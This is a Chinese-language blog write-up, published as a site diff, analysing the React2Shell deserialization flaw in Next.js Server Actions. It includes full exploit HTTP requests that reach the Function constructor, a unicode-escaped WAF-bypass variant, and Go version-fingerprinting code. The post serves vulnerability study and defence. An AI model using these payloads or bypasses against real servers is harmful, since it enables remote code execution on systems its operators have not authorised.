@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="First Dayhttps://github.com/ejpir/CVE-2025-55182-poc 这是第一天给出来的POC，一开始也没说是AI写的，等到后来才在README里面说是AI写的。 在这里给了什么关键函数decodeAction。 跟进分析了半天，触发条件都很奇怪。需要用户主动使用&amp;#39;use server&amp;#39; 暴露危险的函数，那这种写法也太愚蠢了。所以一开始评估这个漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="React2Shell">
+<meta property="og:url" content="http://yoursite.com/2025/12/08/react2shll/index.html">
+<meta property="og:site_name" content="Deen&#39;s blog">
+<meta property="og:description" content="First Dayhttps://github.com/ejpir/CVE-2025-55182-poc 这是第一天给出来的POC，一开始也没说是AI写的，等到后来才在README里面说是AI写的。 在这里给了什么关键函数decodeAction。 跟进分析了半天，触发条件都很奇怪。需要用户主动使用&amp;#39;use server&amp;#39; 暴露危险的函数，那这种写法也太愚蠢了。所以一开始评估这个漏">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-6c9fffba5cc191781993ee1e0573419383b06ad0.png">
+<meta property="og:image" content="https://lh3.googleusercontent.com/d/1t0ifH7O0s_Q0Pad_JtBxMk0SFYTKRbCB">
+<meta property="og:image" content="https://lh3.googleusercontent.com/d/1s3XiURWFTeuPsPf-xjUvI_F9fmaKaQgq">
+<meta property="og:image" content="https://lh3.googleusercontent.com/d/1jI86qEloHxB4Qt9dQWnCX5WZmhs9F52B">
+<meta property="og:updated_time" content="2025-12-12T10:19:37.159Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="React2Shell">
+<meta name="twitter:description" content="First Dayhttps://github.com/ejpir/CVE-2025-55182-poc 这是第一天给出来的POC，一开始也没说是AI写的，等到后来才在README里面说是AI写的。 在这里给了什么关键函数decodeAction。 跟进分析了半天，触发条件都很奇怪。需要用户主动使用&amp;#39;use server&amp;#39; 暴露危险的函数，那这种写法也太愚蠢了。所以一开始评估这个漏">
+<meta name="twitter:image" content="https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-6c9fffba5cc191781993ee1e0573419383b06ad0.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/d33n.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/d33n.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>React2Shell</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+    <link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    <script src="/lib/jquery/jquery.min.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<meta name="theme-color" content="#000000">
+<body>
+    
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2025/10/18/QnQSecctf2025/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <!-- <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li> -->
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <!-- <span id="i-share" class="info" style="display:none;">Share post</span> -->
+    </span>
+    <br/>
+    <!-- <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2025/12/08/react2shll/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2025/12/08/react2shll/&text=React2Shell"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2025/12/08/react2shll/&is_video=false&description=React2Shell"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=React2Shell&body=Check out this article: http://yoursite.com/2025/12/08/react2shll/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2025/12/08/react2shll/&name=React2Shell&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div> -->
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#First-Day"><span class="toc-number">1.</span> <span class="toc-text">First Day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Second-Day"><span class="toc-number">2.</span> <span class="toc-text">Second Day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">3.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prototype-Pollution"><span class="toc-number">3.1.</span> <span class="toc-text">Prototype Pollution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些WAF的绕过"><span class="toc-number">4.</span> <span class="toc-text">一些WAF的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全的探测获取版本"><span class="toc-number">5.</span> <span class="toc-text">安全的探测获取版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2025-12-12更新"><span class="toc-number">6.</span> <span class="toc-text">2025-12-12更新</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        React2Shell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Deen's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2025-12-08T22:37:22.000Z" itemprop="datePublished">2025-12-08</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="First-Day"><a href="#First-Day" class="headerlink" title="First Day"></a>First Day</h2><p><a href="https://github.com/ejpir/CVE-2025-55182-poc" target="_blank" rel="noopener">https://github.com/ejpir/CVE-2025-55182-poc</a></p>
+<p>这是第一天给出来的POC，一开始也没说是AI写的，等到后来才在README里面说是AI写的。</p>
+<p>在这里给了什么关键函数decodeAction。</p>
+<p>跟进分析了半天，触发条件都很奇怪。需要用户主动使用<code>&#39;use server&#39;</code> 暴露危险的函数，那这种写法也太愚蠢了。所以一开始评估这个漏洞危险不高。</p>
+<p><img src="https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/12/attach-6c9fffba5cc191781993ee1e0573419383b06ad0.png" alt></p>
+<h2 id="Second-Day"><a href="#Second-Day" class="headerlink" title="Second Day"></a>Second Day</h2><p>第二天醒来的时候（醒的有点晚），无条件RCE的payload已经满天飞了。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><a href="https://github.com/kavienanj/CVE-2025-55182/blob/main/01-background.md" target="_blank" rel="noopener">https://github.com/kavienanj/CVE-2025-55182/blob/main/01-background.md</a></p>
+<p>回到这个漏洞本身吧</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.31.95:3000</span><br><span class="line"><span class="attribute">User-Agent</span>:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span>: 545</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Next-Action</span>: \tx</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="0"</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   "then":"$1:__proto__:then",</span><br><span class="line">   "status":"resolved_model",</span><br><span class="line">   "reason":-1,</span><br><span class="line">   "value":"&#123;\"then\": \"$B0\"&#125;",</span><br><span class="line">   "_response":&#123;</span><br><span class="line">      "_prefix":"throw Object.assign(new Error('NEXT_REDIRECT'),&#123;digest:'NEXT_REDIRECT;push;/login?a=hacked;307;'&#125;);",</span><br><span class="line">      "_formData":&#123;</span><br><span class="line">         "get":"$1:constructor:constructor"</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="1"</span><br><span class="line"></span><br><span class="line">"$@0"</span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lh3.googleusercontent.com/d/1t0ifH7O0s_Q0Pad_JtBxMk0SFYTKRbCB" alt></p>
+<h3 id="Prototype-Pollution"><a href="#Prototype-Pollution" class="headerlink" title="Prototype Pollution"></a>Prototype Pollution</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; (&#123;&#125;)[<span class="string">'__proto__'</span>][<span class="string">'new'</span>] = <span class="number">123</span></span><br><span class="line">&lt; <span class="number">123</span></span><br><span class="line">&gt; <span class="built_in">window</span>.<span class="keyword">new</span></span><br><span class="line">&lt; <span class="number">123</span></span><br><span class="line">&gt; <span class="keyword">typeof</span> <span class="built_in">window</span></span><br><span class="line">&lt; <span class="string">'object'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lh3.googleusercontent.com/d/1s3XiURWFTeuPsPf-xjUvI_F9fmaKaQgq" alt></p>
+<p>但是这里不像这样，这里是没有赋值的。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> 1. 传统的原型污染 (The <span class="string">"Polluter"</span>)</span><br><span class="line">攻击者输入：&#123;<span class="string">"__proto__"</span>: &#123;<span class="string">"isAdmin"</span>: <span class="literal">true</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">过程：代码执行 target[key] = value。</span><br><span class="line"></span><br><span class="line">结果：Object.prototype.isAdmin 变成了 <span class="literal">true</span>。</span><br><span class="line"></span><br><span class="line">影响：之后代码里 user.isAdmin 都会变成 <span class="literal">true</span>，哪怕<span class="built_in"> user </span>对象本身没有这个属性。</span><br><span class="line"></span><br><span class="line">2. 本案中的利用 (The <span class="string">"Hijacker"</span>)</span><br><span class="line">攻击者输入：&#123;<span class="string">"get"</span>: <span class="string">"<span class="variable">$1</span>:constructor:constructor"</span>&#125;</span><br><span class="line"></span><br><span class="line">过程：Next.js 解析器在构建对象时，解析引用字符串。</span><br><span class="line"></span><br><span class="line">找到 <span class="variable">$1</span> (当前对象)。</span><br><span class="line"></span><br><span class="line">读取 <span class="variable">$1</span>.constructor (即 Object 构造函数)。</span><br><span class="line"></span><br><span class="line">读取 Object.constructor (即 Function 构造函数)。</span><br><span class="line"></span><br><span class="line">关键动作：将这个 Function 构造函数 赋值 给当前正在构建的对象的 _formData.<span class="builtin-name">get</span> 属性。</span><br><span class="line"></span><br><span class="line">结果：obj._formData.<span class="builtin-name">get</span> 现在就是 Function 构造器。</span><br><span class="line"></span><br><span class="line">影响：它并没有弄脏全局环境，它只是把当前这个对象的 <span class="builtin-name">get</span> 方法偷换成了代码执行引擎。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">结构通常如下：</span><br><span class="line"></span><br><span class="line">Next-Action ID: 在 Header 中。</span><br><span class="line"></span><br><span class="line">Body:</span><br><span class="line"></span><br><span class="line">Part 1 (<span class="attribute">name</span>=<span class="string">"1"</span>): 主入口，通常是一个引用 <span class="string">"<span class="variable">$@0</span>"</span>。</span><br><span class="line"></span><br><span class="line">Part 0 (<span class="attribute">name</span>=<span class="string">"0"</span>): 实际参数数据，是一个复杂的 JSON 对象。</span><br><span class="line"></span><br><span class="line"><span class="variable">$@</span> 前缀: 在<span class="built_in"> Server </span>Action 的请求体中，你可能会看到 <span class="string">"<span class="variable">$@</span>&lt;ID&gt;"</span>。这通常表示这是一个 Promise 或者是一个根引用。</span><br></pre></td></tr></table></figure>
+
+<p>比如这里 <code>&quot;then&quot;:&quot;$1:__proto__:then&quot;,</code> 因为 1的内容是<code>&quot;$@0&quot;</code>, <code>&quot;$@&lt;ID&gt;&quot;</code>通常是表示一个promise，所有他有then属性。</p>
+<h2 id="一些WAF的绕过"><a href="#一些WAF的绕过" class="headerlink" title="一些WAF的绕过"></a>一些WAF的绕过</h2><ul>
+<li>主要是一个unicode编码。</li>
+<li>引用的位置可以变换</li>
+<li>超大数据包</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.31.95:3000</span><br><span class="line"><span class="attribute">User-Agent</span>:  Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span>: 742</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Next-Action</span>: \tx</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="0"</span><br><span class="line"></span><br><span class="line">&#123;"then": "$2", "status": "resolved_model", "reason": -1, "value": "&#123;\"then\": \"$B0\"&#125;", "_response": &#123;"_prefix": "throw Object.assign(new Error('NEXT_REDIRECT'),&#123;digest:'NEXT_REDIRECT;push;/login?a=hacked;307;'&#125;);", "_formData": &#123;"get": "$1:\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072\u003a\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072"&#125;&#125;&#125;</span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="1"</span><br><span class="line"></span><br><span class="line">"$\u00400"</span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="2"</span><br><span class="line"></span><br><span class="line">"$1:\u005F\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f:then"</span><br><span class="line">--e0b0955de0b0955de0b0955de0b0955d--</span><br></pre></td></tr></table></figure>
+
+<h2 id="安全的探测获取版本"><a href="#安全的探测获取版本" class="headerlink" title="安全的探测获取版本"></a>安全的探测获取版本</h2><p>先判断是不是next的服务，然后遍历js，匹配对应的版本。</p>
+<pre><code class="go">u, err := url.Parse(URL)
+<span class="keyword">if</span> err != <span class="literal">nil</span> {
+    fmt.Printf(<span class="string">"解析 URL 失败: %v\n"</span>, err)
+    <span class="keyword">return</span> <span class="literal">false</span>
+}
+
+<span class="comment">// 2. 获取 Pathname</span>
+pathname := u.Path
+<span class="keyword">if</span> pathname == <span class="string">""</span> {
+    URL = URL + <span class="string">"/_next"</span>
+}
+
+<span class="keyword">if</span> pathname == <span class="string">"/"</span> {
+    URL = URL + <span class="string">"_next"</span>
+}
+
+client := &amp;http.Client{
+    Timeout: <span class="number">5</span> * time.Second,
+    <span class="comment">// Transport: &amp;http.Transport{TLSClientConfig: &amp;tls.Config{InsecureSkipVerify: true}},</span>
+}
+
+req, err := http.NewRequest(<span class="string">"GET"</span>, URL, <span class="literal">nil</span>)
+<span class="keyword">if</span> err != <span class="literal">nil</span> {
+    fmt.Printf(<span class="string">"创建请求失败: %v\n"</span>, err)
+    <span class="keyword">return</span> <span class="literal">false</span>
+}
+
+<span class="comment">// 模拟浏览器 UA，防止被某些 WAF 拦截</span>
+req.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"</span>)
+
+resp, err := client.Do(req)
+<span class="keyword">if</span> err != <span class="literal">nil</span> {
+    fmt.Printf(<span class="string">"请求失败: %v\n"</span>, err)
+    <span class="keyword">return</span> <span class="literal">false</span>
+}
+<span class="keyword">defer</span> resp.Body.Close()
+
+bodyBytes, err := ioutil.ReadAll(resp.Body)
+<span class="keyword">if</span> err != <span class="literal">nil</span> {
+    <span class="keyword">return</span> <span class="literal">false</span>
+}
+bodyString := <span class="keyword">string</span>(bodyBytes)
+
+<span class="comment">// 识别逻辑</span>
+isNext := <span class="literal">false</span>
+detectedInfo := []<span class="keyword">string</span>{}
+
+<span class="comment">// 1. 检查 HTTP Header (X-Powered-By)</span>
+poweredBy := resp.Header.Get(<span class="string">"X-Powered-By"</span>)
+<span class="keyword">if</span> strings.Contains(strings.ToLower(poweredBy), <span class="string">"next.js"</span>) {
+    isNext = <span class="literal">true</span>
+    detectedInfo = <span class="built_in">append</span>(detectedInfo, <span class="string">"Header: "</span>+poweredBy)
+}
+
+<span class="comment">// 2. 检查 HTML 源码中的 __NEXT_DATA__</span>
+<span class="keyword">if</span> strings.Contains(bodyString, <span class="string">"__NEXT_DATA__"</span>) || strings.Contains(bodyString, <span class="string">"/_next/static/"</span>) {
+    isNext = <span class="literal">true</span>
+    detectedInfo = <span class="built_in">append</span>(detectedInfo, <span class="string">"Header: "</span>+poweredBy)
+}
+
+<span class="keyword">if</span> isNext {
+    <span class="comment">// 1. 定义版本匹配的正则</span>
+    <span class="comment">// 覆盖两种情况：</span>
+    <span class="comment">// A: window.next={version:"15.4.6", ...}  -&gt; 匹配 version:"..."</span>
+    <span class="comment">// B: t.version="12.2.5"                   -&gt; 匹配 .version="..."</span>
+    reJsVersion := regexp.MustCompile(<span class="string">`window\.next\s*=\s*\{.*?version\s*:\s*"([^"]+)"`</span>)
+
+    <span class="comment">// 2. 提取 script src</span>
+    reScriptSrc := regexp.MustCompile(<span class="string">`&lt;script[^&gt;]+src=["']([^"']+)["']`</span>)
+    scriptMatches := reScriptSrc.FindAllStringSubmatch(bodyString, <span class="number">-1</span>)
+
+    foundVersion := <span class="string">""</span>
+
+    <span class="comment">// 3. 遍历找到的 JS 链接</span>
+    <span class="keyword">for</span> _, match := <span class="keyword">range</span> scriptMatches {
+        src := match[<span class="number">1</span>]
+
+        <span class="comment">// 优化：只访问 Next.js 的静态资源文件 (/_next/static/)，忽略第三方统计脚本等</span>
+        <span class="keyword">if</span> !strings.Contains(src, <span class="string">"/_next/static/"</span>) {
+            <span class="keyword">continue</span>
+        }
+
+        <span class="comment">// 4. URL 拼接处理 (处理相对路径)</span>
+        jsURL := src
+        <span class="keyword">if</span> strings.HasPrefix(src, <span class="string">"/"</span>) {
+            <span class="comment">// 既然 Check 函数里已经 parse 过 URL，这里最好重新 parse 一下 base URL</span>
+            u, _ := url.Parse(URL)
+            jsURL = fmt.Sprintf(<span class="string">"%s://%s%s"</span>, u.Scheme, u.Host, src)
+        } <span class="keyword">else</span> <span class="keyword">if</span> !strings.HasPrefix(src, <span class="string">"http"</span>) {
+            <span class="comment">// 简单的相对路径处理</span>
+            u, _ := url.Parse(URL)
+            <span class="comment">// 去掉 path，只留 host</span>
+            jsURL = fmt.Sprintf(<span class="string">"%s://%s/%s"</span>, u.Scheme, u.Host, src)
+        }
+
+        <span class="comment">// 5. 请求 JS 文件内容</span>
+        <span class="comment">// 创建短超时的 Client，避免卡死</span>
+        jsClient := &amp;http.Client{Timeout: <span class="number">5</span> * time.Second}
+        fmt.Println(<span class="string">"js url: "</span>, jsURL)
+        jsResp, err := jsClient.Get(jsURL)
+        <span class="keyword">if</span> err != <span class="literal">nil</span> {
+            <span class="keyword">continue</span>
+        }
+
+        jsBodyBytes, err := ioutil.ReadAll(jsResp.Body)
+        jsResp.Body.Close()
+        <span class="keyword">if</span> err != <span class="literal">nil</span> {
+            <span class="keyword">continue</span>
+        }
+        jsContent := <span class="keyword">string</span>(jsBodyBytes)
+
+        <span class="comment">// 6. 在 JS 内容中匹配版本</span>
+        vMatch := reJsVersion.FindStringSubmatch(jsContent)
+        <span class="keyword">if</span> <span class="built_in">len</span>(vMatch) &gt; <span class="number">1</span> {
+            foundVersion = vMatch[<span class="number">1</span>]
+            detectedInfo = <span class="built_in">append</span>(detectedInfo, <span class="string">"Version: "</span>+foundVersion)
+            <span class="comment">// detectedInfo = append(detectedInfo, "Source: "+src) // 记录是从哪个js发现的</span>
+            <span class="keyword">break</span> <span class="comment">// 找到一个版本号就停止，节省时间</span>
+        }
+    }
+
+    fmt.Println(detectedInfo)
+
+    <span class="comment">// 之前保留的 BuildId 逻辑（可选，建议保留作为补充）</span>
+    <span class="comment">//reBuildId := regexp.MustCompile(`"buildId":"(.*?)"`)</span>
+    <span class="comment">//matches := reBuildId.FindStringSubmatch(bodyString)</span>
+    <span class="comment">//if len(matches) &gt; 1 {</span>
+    <span class="comment">//    detectedInfo = append(detectedInfo, "BuildId: "+matches[1])</span>
+    <span class="comment">//}</span>
+
+    <span class="comment">// 构造返回结果</span>
+    result := d.info
+    result.Response = strings.Join(detectedInfo, <span class="string">" | "</span>)
+    result.Request = URL
+
+    <span class="keyword">if</span> result.Response == <span class="string">""</span> {
+        result.Response = <span class="string">"Next.js Detected (No explicit version found in JS files)"</span>
+    }</code></pre>
+<p><img src="https://lh3.googleusercontent.com/d/1jI86qEloHxB4Qt9dQWnCX5WZmhs9F52B" alt></p>
+<h2 id="2025-12-12更新"><a href="#2025-12-12更新" class="headerlink" title="2025-12-12更新"></a>2025-12-12更新</h2><p>出了一个dos漏洞，看了下poc，和我之前调试原理一模一样，flight协议可以使用$、$@互相引用chunk，我用了两个chunk互相引用形成了死循环，poc直接引用自身导致死循环…..就这样擦肩而过….</p>
+<p>又重新分析了一下，那些说什么用了vite什么也受影响的都是在瞎扯，搭建环境真的去调试验证才是真道理。</p>
+<p>这里面关键入口就是decodeReply。</p>
+<p>以后都用rwsdk调试，不知道调试next为什么那么麻烦，rwsdk打印调用栈非常清晰。</p>
+<p>除了最后命令执行不了。解释执行的worker就已经限制死了。<br><code>Code generation from strings disallowed for this context</code></p>
+<p>真正去调试分析，验证了，才有真的发言权。其他都是扯淡。</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#First-Day"><span class="toc-number">1.</span> <span class="toc-text">First Day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Second-Day"><span class="toc-number">2.</span> <span class="toc-text">Second Day</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">3.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Prototype-Pollution"><span class="toc-number">3.1.</span> <span class="toc-text">Prototype Pollution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一些WAF的绕过"><span class="toc-number">4.</span> <span class="toc-text">一些WAF的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全的探测获取版本"><span class="toc-number">5.</span> <span class="toc-text">安全的探测获取版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2025-12-12更新"><span class="toc-number">6.</span> <span class="toc-text">2025-12-12更新</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2025/12/08/react2shll/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2025/12/08/react2shll/&text=React2Shell"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2025/12/08/react2shll/&title=React2Shell"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
